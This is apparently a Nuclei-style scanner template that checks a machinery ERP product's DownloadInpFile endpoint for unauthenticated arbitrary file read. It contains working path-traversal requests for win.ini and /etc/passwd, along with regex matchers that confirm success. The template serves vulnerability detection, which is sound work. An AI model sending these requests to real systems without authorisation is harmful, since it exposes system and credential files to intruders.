id: zsjxerp-DownloadInpFile-lfi

info:
  name: Template Name
  author: wangzong
  severity: high
  description: 哲霖机械ERP DownloadInpFile 接口存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。
  reference:
    - https://github.com/wy876/POC/commit/f8d1c71b95c42a687b5b05af9c38e86b49051ea6
  tags: tags

http:
  - method: GET
    path:
      - "{{BaseURL}}/Basics/DownloadInpFile?filePath=C:\windows\win.ini"
      - "{{BaseURL}}/Basics/DownloadInpFile?filePath=/etc/passwd"
    matchers:
      - type: regex
        part: body
        regex:
          - "\\[(font|extension|file)s\\]"
          - "root:.*:0:0:"
        condition: or